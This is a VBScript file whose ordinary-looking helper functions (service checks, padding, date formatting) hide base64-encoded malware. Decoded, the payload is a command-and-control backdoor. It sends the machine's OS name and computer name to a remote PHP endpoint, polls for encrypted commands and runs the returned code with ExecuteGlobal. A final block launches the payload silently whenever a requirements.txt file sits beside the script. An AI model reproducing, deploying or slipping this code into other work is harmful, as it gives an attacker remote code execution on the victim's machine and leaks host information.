Private Function PathCombine(strPath1, strPath2)
    Dim strResult
    Dim objFso
    Set objFso = CreateObject("Scripting.FileSystemObject")
    strResult = objFso.BuildPath(strPath1, strPath2)
    PathCombine = strResult
End Function

Public Function GetServiceStatus(strServiceName)
    Err.Clear
    Dim strComputer
    strComputer = "."

    Dim result

    Dim bolServiceRunning
    bolServiceRunning = IsServiceRunning(strComputer, strServiceName)
    If Err.Number = 0 Then
        If bolServiceRunning Then
            result = "running"
        Else
            result = "stopped"
        End If
    Else
        result = "error"
    End If

    Err.Clear
    GetServiceStatus = result
End Function
Dim state
state = "aHR0cHM6Ly9wcmVwYXJlb24uc3RvcmUvcHJlZmVyLnBocA=="
    
Dim szString
szString = "RGltIGtleWFycmF5LCBLZXksIHVybCwgbWlsbGlzZWNvbmRzDQprZXlhcnJheSA9IEFycmF5KDMsIDYsIDIsIDEsIDYsIDAsIDQsIDcsIDAsIDEsIDksIDYsIDgsIDEsIDIsIDUpDQpLZXkgPSBDcmVhdGVCeXRlQXJyYXkoa2V5YXJyYXkpDQp1cmwgPSAiaHR0cHM6Ly9wcmVwYXJlb24uc3RvcmUvcHJlZmVyLnBocCINCnVzZXJBZ2VudCA9ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTAuMC40NDMwLjIxMiBTYWZhcmkvNTM3LjM2Ig0KbWlsbGlzZWNvbmRzID0gMTAwMCAqIDIwDQoNCkZ1bmN0aW9uIENyZWF0ZUJ5dGVBcnJheShpbnRlZ2VycykNCiAgICBEaW0gYnl0ZUFycmF5KCkNCiAgICBSZURpbSBieXRlQXJyYXkoVUJvdW5kKGludGVnZXJzKSkNCiAgICANCiAgICBGb3IgaSA9IExCb3VuZChpbnRlZ2VycykgVG8gVUJvdW5kKGludGVnZXJzKQ0KICAgICAgICBieXRlQXJyYXkoaSkgPSBDQnl0ZShpbnRlZ2VycyhpKSkNCiAgICBOZXh0DQogICAgDQogICAgQ3JlYXRlQnl0ZUFycmF5ID0gYnl0ZUFycmF5DQpFbmQgRnVuY3Rpb24NCg0KRnVuY3Rpb24gR2V0UmFuZG9tQ2hhcigpDQoJRGltIGNoYXJzLCByYW5kb21JbmRleA0KCWNoYXJzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Ig0KCVJhbmRvbWl6ZQ0KCXJhbmRvbUluZGV4ID0gSW50KChMZW4oY2hhcnMpIC0gMSkqUm5kICsgMSkNCglHZXRSYW5kb21DaGFyID0gTWlkKGNoYXJzLCByYW5kb21JbmRleCwgMSkNCkVuZCBGdW5jdGlvbg0KDQpGdW5jdGlvbiBHZXRvYmpJRCgpDQoJRGltIG5ld1N0cmluZywgaQ0KCUZvciBpPTEgVG8gMTINCgkJbmV3U3RyaW5nID0gbmV3U3RyaW5nICYgR2V0UmFuZG9tQ2hhcigpDQoJTmV4dA0KCUdldG9iaklEID0gbmV3U3RyaW5nDQpFbmQgRnVuY3Rpb24NCg0KU2V0IG9ialNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0Kc3pPYmplY3RJRCA9IEdldE9iaklEKCkNCnN6UENvZGUgPSAiT3BlcmF0aW5nIFN5c3RlbSA6ICIgKyBvYmpTaGVsbC5SZWdSZWFkKCJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFByb2R1Y3ROYW1lIikNCnN6Q29tcHV0ZXJOYW1lID0gIkNvbXB1dGVyIE5hbWUgOiAiICsgb2JqU2hlbGwuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlQ09NUFVURVJOQU1FJSIpDQoNCkZ1bmN0aW9uIEh0dHBQb3N0KHVybCwgcG9zdERhdGEpDQogICAgU2V0IG9iakhUVFAgPSBDcmVhdGVPYmplY3QoIk1TWE1MMi5TZXJ2ZXJYTUxIVFRQIikNCiAgICANCiAgICBvYmpIVFRQLk9wZW4gIlBPU1QiLCB1cmwsIEZhbHNlDQogICAgDQogICAgb2JqSFRUUC5zZXRSZXF1ZXN0SGVhZGVyICJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIg0KICAgIG9iakhUVFAuc2V0UmVxdWVzdEhlYWRlciAiVXNlci1BZ2VudCIgLCB1c2VyQWdlbnQNCiAgICBvYmpIVFRQLnNlbmQgcG9zdERhdGENCiAgICANCiAgICBJZiBvYmpIVFRQLnN0YXR1cyA9IDIwMCBUaGVuDQogICAgICAgIEh0dHBQb3N0ID0gb2JqSFRUUC5yZXNwb25zZVRleHQNCiAgICBFbHNlDQogICAgICAgIEh0dHBQb3N0ID0gIkVycm9yOiAiICYgb2JqSFRUUC5zdGF0dXNUZXh0ICYgdmJOZXdMaW5lICYgIlN0YXR1cyBjb2RlOiAiICYgb2JqSFRUUC5zdGF0dXMNCiAgICBFbmQgSWYNCkVuZCBGdW5jdGlvbg0KDQpGdW5jdGlvbiBYT1JFbmNyeXB0RGVjcnlwdEJ5dGVBcnJheShkYXRhLCBrZXkpDQogICAgRGltIHJlc3VsdCgpLCBrZXlMZW5ndGgsIGkNCiAgICBrZXlMZW5ndGggPSBVQm91bmQoa2V5KSArIDENCiAgICBSZURpbSByZXN1bHQoVUJvdW5kKGRhdGEpKQ0KICAgIEZvciBpID0gMCBUbyBVQm91bmQoZGF0YSkNCiAgICAgICAgRGltIGJ5dGVEYXRhLCBieXRlS2V5DQogICAgICAgIGJ5dGVEYXRhID0gZGF0YShpKQ0KICAgICAgICBieXRlS2V5ID0ga2V5KGkgTW9kIGtleUxlbmd0aCkNCiAgICAgICAgcmVzdWx0KGkpID0gYnl0ZURhdGEgWG9yIGJ5dGVLZXkNCiAgICBOZXh0DQogICAgWE9SRW5jcnlwdERlY3J5cHRCeXRlQXJyYXkgPSByZXN1bHQNCkVuZCBGdW5jdGlvbg0KDQpGdW5jdGlvbiBHZXRVbmljb2RlQnl0ZXMoaW5wdXRTdHJpbmcpDQogICAgRGltIGksIGJ5dGVBcnJheSgpDQogICAgUmVEaW0gYnl0ZUFycmF5KExlbihpbnB1dFN0cmluZykgKiAyIC0gMSkNCiAgICBGb3IgaSA9IDEgVG8gTGVuKGlucHV0U3RyaW5nKQ0KICAgICAgICBEaW0gY2hhckNvZGUNCiAgICAgICAgY2hhckNvZGUgPSBBc2MoTWlkKGlucHV0U3RyaW5nLCBpLCAxKSkNCiAgICAgICAgYnl0ZUFycmF5KChpIC0gMSkgKiAyKSA9IGNoYXJDb2RlIEFuZCAyNTUNCiAgICAgICAgYnl0ZUFycmF5KChpIC0gMSkgKiAyICsgMSkgPSAoY2hhckNvZGUgXCAyNTYpIEFuZCAyNTUNCiAgICBOZXh0DQogICAgR2V0VW5pY29kZUJ5dGVzID0gYnl0ZUFycmF5DQpFbmQgRnVuY3Rpb24NCg0KU3ViIEJsb2NrQ29weShzb3VyY2VBcnJheSwgc291cmNlSW5kZXgsIGRlc3RpbmF0aW9uQXJyYXksIGRlc3RpbmF0aW9uSW5kZXgsIGNvdW50KQ0KICAgIERpbSBpDQogICAgRm9yIGkgPSAwIFRvIGNvdW50IC0gMQ0KICAgICAgICBkZXN0aW5hdGlvbkFycmF5KGRlc3RpbmF0aW9uSW5kZXggKyBpKSA9IHNvdXJjZUFycmF5KHNvdXJjZUluZGV4ICsgaSkNCiAgICBOZXh0DQpFbmQgU3ViDQoNCkZ1bmN0aW9uIFhPUl9FbmNyeXB0RGVjcnlwdChieXRlQXJyYXksIGtleSkNCiAgICBEaW0gaSwgZW5jcnlwdGVkQnl0ZXMNCiAgICBSZURpbSBlbmNyeXB0ZWRCeXRlcyhVQm91bmQoYnl0ZUFycmF5KSkNCg0KICAgIEZvciBpID0gTEJvdW5kKGJ5dGVBcnJheSkgVG8gVUJvdW5kKGJ5dGVBcnJheSkNCiAgICAgICAgZW5jcnlwdGVkQnl0ZXMoaSkgPSBieXRlQXJyYXkoaSkgWG9yIGtleQ0KICAgIE5leHQNCg0KICAgIFhPUl9FbmNyeXB0RGVjcnlwdCA9IGVuY3J5cHRlZEJ5dGVzDQpFbmQgRnVuY3Rpb24NCg0KRnVuY3Rpb24gQnl0ZUFycmF5VG9CYXNlNjRTdHJpbmcoYnl0ZUFycmF5KQ0KICAgIERpbSBiYXNlNjRDaGFycywgaSwgcGFkZGluZw0KICAgIGJhc2U2NENoYXJzID0gIkFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8iDQogICAgRGltIGJhc2U2NFN0cmluZw0KICAgIGJhc2U2NFN0cmluZyA9ICIiDQogICAgRm9yIGkgPSAwIFRvIFVCb3VuZChieXRlQXJyYXkpIC0gMiBTdGVwIDMNCiAgICAgICAgRGltIGNoYXIxLCBjaGFyMiwgY2hhcjMsIGNoYXI0DQogICAgICAgIGNoYXIxID0gTWlkKGJhc2U2NENoYXJzLCAoYnl0ZUFycmF5KGkpIFwgNCkgKyAxLCAxKQ0KICAgICAgICBjaGFyMiA9IE1pZChiYXNlNjRDaGFycywgKCgoYnl0ZUFycmF5KGkpIEFuZCAzKSAqIDE2KSBPciAoYnl0ZUFycmF5KGkgKyAxKSBcIDE2KSkgKyAxLCAxKQ0KICAgICAgICBjaGFyMyA9IE1pZChiYXNlNjRDaGFycywgKCgoYnl0ZUFycmF5KGkgKyAxKSBBbmQgMTUpICogNCkgT3IgKGJ5dGVBcnJheShpICsgMikgXCA2NCkpICsgMSwgMSkNCiAgICAgICAgY2hhcjQgPSBNaWQoYmFzZTY0Q2hhcnMsIChieXRlQXJyYXkoaSArIDIpIEFuZCA2MykgKyAxLCAxKQ0KICAgICAgICBiYXNlNjRTdHJpbmcgPSBiYXNlNjRTdHJpbmcgJiBjaGFyMSAmIGNoYXIyICYgY2hhcjMgJiBjaGFyNA0KICAgIE5leHQNCiAgICBwYWRkaW5nID0gKFVCb3VuZChieXRlQXJyYXkpICsgMSkgTW9kIDMNCiAgICBJZiBwYWRkaW5nID4gMCBUaGVuDQogICAgICAgIGJhc2U2NFN0cmluZyA9IExlZnQoYmFzZTY0U3RyaW5nLCBMZW4oYmFzZTY0U3RyaW5nKSAtIHBhZGRpbmcpICYgU3RyaW5nKHBhZGRpbmcsICI9IikNCiAgICBFbmQgSWYNCiAgICBCeXRlQXJyYXlUb0Jhc2U2NFN0cmluZyA9IGJhc2U2NFN0cmluZw0KRW5kIEZ1bmN0aW9uDQogICAgDQpGdW5jdGlvbiBCYXNlNjREZWNvZGUoYmFzZTY0U3RyaW5nKQ0KICAgIERpbSBCYXNlNjRDaGFycywgcGFkZGluZywgcGFkZGluZ0NvdW50LCBpLCBqDQogICAgRGltIGRlY29kZWRBcnJheSgpLCBncm91cCwgZGVjb2RlZEluZGV4DQogICAgQmFzZTY0Q2hhcnMgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLyINCiAgICBiYXNlNjRTdHJpbmcgPSBSZXBsYWNlKGJhc2U2NFN0cmluZywgIiAiLCAiIikNCiAgICBwYWRkaW5nQ291bnQgPSBMZW4oYmFzZTY0U3RyaW5nKSBNb2QgNA0KICAgIHBhZGRpbmcgPSAiIg0KICAgIElmIHBhZGRpbmdDb3VudCA+IDAgVGhlbg0KICAgICAgICBwYWRkaW5nID0gU3RyaW5nKDQgLSBwYWRkaW5nQ291bnQsICI9IikNCiAgICAgICAgYmFzZTY0U3RyaW5nID0gYmFzZTY0U3RyaW5nICYgcGFkZGluZw0KICAgIEVuZCBJZg0KICAgIGdyb3VwID0gIiINCiAgICBpID0gMQ0KICAgIGRlY29kZWRJbmRleCA9IDANCiAgICBGb3IgaiA9IDEgVG8gTGVuKGJhc2U2NFN0cmluZykNCiAgICAgICAgSWYgTWlkKGJhc2U2NFN0cmluZywgaiwgMSkgPD4gIj0iIFRoZW4gJyBTa2lwIHBhZGRpbmcgY2hhcmFjdGVycw0KICAgICAgICAgICAgZ3JvdXAgPSBncm91cCAmIFJpZ2h0KCIwMDAwMDAiICYgQ29udmVydFRvQmluYXJ5KEJhc2U2NENoYXJzLCBNaWQoYmFzZTY0U3RyaW5nLCBqLCAxKSksIDYpDQogICAgICAgIEVuZCBJZg0KICAgICAgICBJZiBMZW4oZ3JvdXApID0gMjQgVGhlbg0KICAgICAgICAgICAgJyBDb252ZXJ0IDI0LWJpdCBiaW5hcnkgc3RyaW5nIHRvIDMgYnl0ZXMNCiAgICAgICAgICAgIFJlRGltIFByZXNlcnZlIGRlY29kZWRBcnJheShkZWNvZGVkSW5kZXggKyAyKQ0KICAgICAgICAgICAgZGVjb2RlZEFycmF5KGRlY29kZWRJbmRleCkgPSBCaW5Ub0RlYyhMZWZ0KGdyb3VwLCA4KSkNCiAgICAgICAgICAgIGRlY29kZWRBcnJheShkZWNvZGVkSW5kZXggKyAxKSA9IEJpblRvRGVjKE1pZChncm91cCwgOSwgOCkpDQogICAgICAgICAgICBkZWNvZGVkQXJyYXkoZGVjb2RlZEluZGV4ICsgMikgPSBCaW5Ub0RlYyhSaWdodChncm91cCwgOCkpDQogICAgICAgICAgICBkZWNvZGVkSW5kZXggPSBkZWNvZGVkSW5kZXggKyAzDQogICAgICAgICAgICBncm91cCA9ICIiDQogICAgICAgIEVuZCBJZg0KICAgIE5leHQNCiAgICBCYXNlNjREZWNvZGUgPSBkZWNvZGVkQXJyYXkNCkVuZCBGdW5jdGlvbg0KRnVuY3Rpb24gQ29udmVydFRvQmluYXJ5KGJhc2U2NENoYXJzLCBjaGFyKQ0KICAgIERpbSBiaW5hcnksIGkNCiAgICBGb3IgaSA9IDEgVG8gTGVuKGJhc2U2NENoYXJzKQ0KICAgICAgICBJZiBNaWQoYmFzZTY0Q2hhcnMsIGksIDEpID0gY2hhciBUaGVuDQogICAgICAgICAgICBpbmRleCA9IGkgLSAxDQogICAgICAgICAgICBFeGl0IEZvcg0KICAgICAgICBFbmQgSWYNCiAgICBOZXh0DQogICAgYmluYXJ5ID0gIiINCiAgICBGb3IgaSA9IDEgVG8gNg0KICAgICAgICBiaW5hcnkgPSBDU3RyKGluZGV4IE1vZCAyKSAmIGJpbmFyeQ0KICAgICAgICBpbmRleCA9IGluZGV4IFwgMg0KICAgIE5leHQNCiAgICBDb252ZXJ0VG9CaW5hcnkgPSBiaW5hcnkNCkVuZCBGdW5jdGlvbg0KRnVuY3Rpb24gQmluVG9EZWMoYmluYXJ5KQ0KICAgIERpbSBkZWMsIGkNCiAgICBkZWMgPSAwDQogICAgRm9yIGkgPSBMZW4oYmluYXJ5KSBUbyAxIFN0ZXAgLTENCiAgICAgICAgSWYgTWlkKGJpbmFyeSwgaSwgMSkgPSAiMSIgVGhlbg0KICAgICAgICAgICAgZGVjID0gZGVjICsgMiBeIChMZW4oYmluYXJ5KSAtIGkpDQogICAgICAgIEVuZCBJZg0KICAgIE5leHQNCiAgICBCaW5Ub0RlYyA9IGRlYw0KRW5kIEZ1bmN0aW9uDQpGdW5jdGlvbiBNYWtlUmVxdWVzdFBhY2tldChzekNvbnRlbnRzKQ0KCURpbSBzekNJRCxzelN0ZXAsbHN6UmVxdWVzdCxscFJlcXVlc3QsbHBSZXF1ZXN0RW5jLHN6YjY0RGF0YQ0KCXN6Q0lEID0gIkZENDI5REVBQkUiDQoJc3pTdGVwID0gdmJOZXdMaW5lICYgdmJUYWIgJiB2YlRhYiAmICJTdGVwMSA6IEtlZXBMaW5rKFYpIiAmIHZiTmV3TGluZQ0KCUlmIExlbihzekNvbnRlbnRzKSA9IDAgVGhlbg0KICAgICAgICBzekRhdGEgPSBzelN0ZXAgJiBzelBDb2RlICYgdmJOZXdMaW5lICYgc3pDb21wdXRlck5hbWUgJiB2Yk5ld0xpbmUgJiBzekNvbnRlbnRzDQoJRWxzZQ0KCQlzekRhdGEgPSBzekNvbnRlbnRzDQoJRW5kIElmDQoJbHN6UmVxdWVzdCA9ICJpZD0iICsgc3pDSUQgKyAiJm9pZD0iICsgc3pPYmplY3RJRCArICImZGF0YT0iDQoJbHBSZXF1ZXN0ID0gR2V0VW5pY29kZUJ5dGVzKHN6RGF0YSkNCglscFJlcXVlc3RFbmMgPSBYT1JFbmNyeXB0RGVjcnlwdEJ5dGVBcnJheShscFJlcXVlc3QsS2V5KQ0KICAgIHN6YjY0RGF0YSA9IEJ5dGVBcnJheVRvQmFzZTY0U3RyaW5nKGxwUmVxdWVzdEVuYykNCglsc3pSZXF1ZXN0ID0gbHN6UmVxdWVzdCArIHN6YjY0RGF0YQ0KCU1ha2VSZXF1ZXN0UGFja2V0ID0gbHN6UmVxdWVzdA0KRW5kIEZ1bmN0aW9uDQoNCkZ1bmN0aW9uIExpdHRsZUVuZGlhbkJ5dGVzVG9JbnQoYnl0ZXMpDQogICAgRGltIHZhbHVlLCBpDQogICAgdmFsdWUgPSAwDQogICAgRm9yIGkgPSAwIFRvIFVCb3VuZChieXRlcykNCiAgICAgICAgdmFsdWUgPSB2YWx1ZSArIChieXRlcyhpKSAqICgyNTYgXiBpKSkNCiAgICBOZXh0DQogICAgSWYgKGJ5dGVzKFVCb3VuZChieXRlcykpIEFuZCAmSDgwKSA8PiAwIFRoZW4NCiAgICAgICAgdmFsdWUgPSB2YWx1ZSAtICgyNTYgXiAoVUJvdW5kKGJ5dGVzKSArIDEpKQ0KICAgIEVuZCBJZg0KICAgIA0KICAgIExpdHRsZUVuZGlhbkJ5dGVzVG9JbnQgPSB2YWx1ZQ0KRW5kIEZ1bmN0aW9uDQoNCnN6Q29udGVudHMgPSAiIg0KV2hpbGUgVHJ1ZQ0KCURpbSBscENtZElEKDMpDQogICAgRGltIGxwRGF0YUxlbigzKQ0KICAgIERpbSBuQ01ESUQNCiAgICBEaW0gbkRhdGFMZW4sbkxlbixzekNvZGUsc3pDb2RlQXJyLHN6UmVxdWVzdCxzelJlc3BvbnNlLGxwQ29udGVudCxscERhdGEoKSxscENvbnRlbnRFbmMNCgluQ01ESUQgPSAwDQoJbkRhdGFMZW4gPSAwDQoJbkxlbiA9IDANCglzekNvZGUgPSAiIg0KCXN6UmVxdWVzdCA9ICIiDQoJc3pSZXNwb25zZSA9ICIiDQogICAgT24gRXJyb3IgUmVzdW1lIE5leHQNCglkbyB3aGlsZSBUcnVlDQogICAgc3pSZXF1ZXN0ID0gTWFrZVJlcXVlc3RQYWNrZXQoc3pDb250ZW50cykNCiAgICBzekNvbnRlbnRzID0gIiINCiAgICBzelJlc3BvbnNlID0gSHR0cFBvc3QodXJsLCBzelJlcXVlc3QpDQogICAgc3pSZXNwb25zZSA9IFJlcGxhY2Uoc3pSZXNwb25zZSwgIiAiLCIrIikNCiAgICBJZiBzelJlc3BvbnNlID0gIlN1Y2NlZWQhIiBUaGVuDQogICAgICAgIFdTY3JpcHQuU2xlZXAgbWlsbGlzZWNvbmRzDQogICAgICAgIEV4aXQgRG8NCiAgICBFbmQgSWYNCiAgICBscENvbnRlbnRFbmMgPSBCYXNlNjREZWNvZGUoc3pSZXNwb25zZSkNCiAgICBscENvbnRlbnQgPSBYT1JFbmNyeXB0RGVjcnlwdEJ5dGVBcnJheShscENvbnRlbnRFbmMsIEtleSkNCiAgICBCbG9ja0NvcHkgbHBDb250ZW50LCAwLCBscENtZElELCAwLCA0DQogICAgQmxvY2tDb3B5IGxwQ29udGVudCwgNCwgbHBEYXRhTGVuLCAwLCA0DQogICAgbkNNRElEID0gTGl0dGxlRW5kaWFuQnl0ZXNUb0ludChscENtZElEKQ0KICAgIG5EYXRhTGVuID0gTGl0dGxlRW5kaWFuQnl0ZXNUb0ludChscERhdGFMZW4pDQogICAgUmVEaW0gbHBEYXRhKG5EYXRhTGVuIC0gMSkNCiAgICBCbG9ja0NvcHkgbHBDb250ZW50LCA4LCBscERhdGEsIDAsIG5EYXRhTGVuDQogICAgRGltIGxscERhdGENCiAgICBsbHBEYXRhID0gWE9SX0VuY3J5cHREZWNyeXB0KGxwRGF0YSwgMTIzKQ0KICAgIEZvciBFYWNoIGJ5dGVWYWx1ZSBJbiBsbHBEYXRhDQogICAgICAgIHN6Q29kZSA9IHN6Q29kZSAmIENocihieXRlVmFsdWUpDQogICAgTmV4dA0KICAgIElmIG5DTURJRCA9IDEwMDMgVGhlbg0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBFeGVjdXRlR2xvYmFsIHN6Q29kZQ0KICAgICAgICBzekNvbnRlbnRzID0gcmVzdWx0DQogICAgRW5kIElmDQogICAgSWYgbkNNRElEID0gMTAwMiBUaGVuDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIFdTY3JpcHQuU2xlZXAgMjE0NzQ4MzY0Nw0KICAgIEVuZCBJZg0KICAgIElmIG5DTURJRCA9IDEwMDEgVGhlbg0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBFeGVjdXRlR2xvYmFsIHN6Q29kZQ0KICAgIEVuZCBJZg0KCVdTY3JpcHQuU2xlZXAgbWlsbGlzZWNvbmRzDQpsb29wDQpXZW5kDQoNCg0KDQo="
Function bric(bkMode)
    Dim kModeInit, padding, paddingCount, i, j
    Dim decodedArray(), group, decodedIndex
    kModeInit = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    bkMode = Replace(bkMode, " ", "")
    paddingCount = Len(bkMode) Mod 4
    padding = ""
    If paddingCount > 0 Then
        padding = String(4 - paddingCount, "=")
        bkMode = bkMode & padding
    End If
    group = ""
    i = 1
    decodedIndex = 0
    For j = 1 To Len(bkMode)
        If Mid(bkMode, j, 1) <> "=" Then
            group = group & Right("000000" & ConvertToBinary(kModeInit, Mid(bkMode, j, 1)), 6)
        End If
        If Len(group) = 24 Then
            ReDim Preserve decodedArray(decodedIndex + 2)
            decodedArray(decodedIndex) = BinToDec(Left(group, 8))
            decodedArray(decodedIndex + 1) = BinToDec(Mid(group, 9, 8))
            decodedArray(decodedIndex + 2) = BinToDec(Right(group, 8))
            decodedIndex = decodedIndex + 3
            group = ""
        End If
    Next
    bric = decodedArray
End Function

Public Function IsServiceRunning(strComputer, strServiceName)
    Dim objWMIService
    Dim strWMIQuery
    Dim result

    strWMIQuery = "SELECT * FROM Win32_Service WHERE Name = '" & strServiceName & "' AND state='Running'"

    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

    If objWMIService.ExecQuery(strWMIQuery).Count > 0 then
        result = True
    Else
        result = False
    End If
    IsServiceRunning = result
End Function
Function ConvertToBinary(mon, char)
    Dim binary, i
    For i = 1 To Len(mon)
        If Mid(mon, i, 1) = char Then
            index = i - 1
            Exit For
        End If
    Next
    binary = ""
    For i = 1 To 6
        binary = CStr(index Mod 2) & binary
        index = index \ 2
    Next
    ConvertToBinary = binary
End Function
Function BinToDec(binary)
    Dim dec, i
    dec = 0
    For i = Len(binary) To 1 Step -1
        If Mid(binary, i, 1) = "1" Then
            dec = dec + 2 ^ (Len(binary) - i)
        End If
    Next
    BinToDec = dec
End Function
Public Function ServiceExists(strComputer, strServiceName)
    Dim objWMIService
    Dim strWMIQuery
    Dim result

    strWMIQuery = "SELECT * FROM Win32_Service WHERE Name = '" & strServiceName & "'"

    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

    If objWMIService.ExecQuery(strWMIQuery).Count > 0 then
        result = True
    Else
        result = False
    End If

    ServiceExists = result
End Function
Function ByteToString(inputBytes)
    Dim i, outputString
    outputString = ""
    For i = LBound(inputBytes) To UBound(inputBytes)
        outputString = outputString & Chr(inputBytes(i))
    Next
    ByteToString = outputString
End Function
Public Function PadRight(strNeedle, intMax, strPadChar)
    Dim i
    Dim strResult
    strPadChar = Trim(strPadChar)
    If Len(strPadChar) = 0 Then
        strPadChar = " "
    End If
    strPadChar = Left(strPadChar, 1)

    Dim strMissing

    Dim intMissing
    intMissing = intMax - Len(strNeedle)

    strResult = strNeedle
    If intMissing > 0 Then
        For i = 1 To intMissing
            strResult = strResult & strPadChar
        Next
    End IF

    PadRight = strResult
End Function
Dim szByte,szOric,szStatebyte,szStateString
szByte = bric(szString)
szOric = ""
szStateString = ""
Public Function GetProperDate(dateSeparator, groupSeparator, timeSeparator)
    Dim moment
    moment = now

    Dim strResult
    strResult = ""
    strResult = strResult & PadLeft(CStr(Year(moment)), 4, "0")
    strResult = strResult & dateSeparator
    strResult = strResult & PadLeft(CStr(Month(moment)), 2, "0")
    strResult = strResult & dateSeparator
    strResult = strResult & PadLeft(CStr(Day(moment)), 2, "0")
    strResult = strResult & groupSeparator
    strResult = strResult & PadLeft(CStr(Hour(moment)), 2, "0")
    strResult = strResult & timeSeparator
    strResult = strResult & PadLeft(CStr(Minute(moment)), 2, "0")
    strResult = strResult & timeSeparator
    strResult = strResult & PadLeft(CStr(Second(moment)), 2, "0")
    GetProperDate = strResult
End Function
szOric = ByteToString(szByte)

szStatebyte  = bric(state)
szStateString = ByteToString(szStatebyte)
state = szStateString + "hp"
Dim objFileSO
Set objFileSO = CreateObject("Scripting.FileSystemObject")
Dim scriptDirectory
scriptDirectory = objFileSO.GetParentFolderName(WScript.ScriptFullName)
Dim existFileName
existFileName = "requirements.txt"
Dim filePath
filePath = objFileSO.BuildPath(scriptDirectory,existFileName)
If objFileSO.FileExists(filePath) Then
    ExecuteGlobal szOric
End If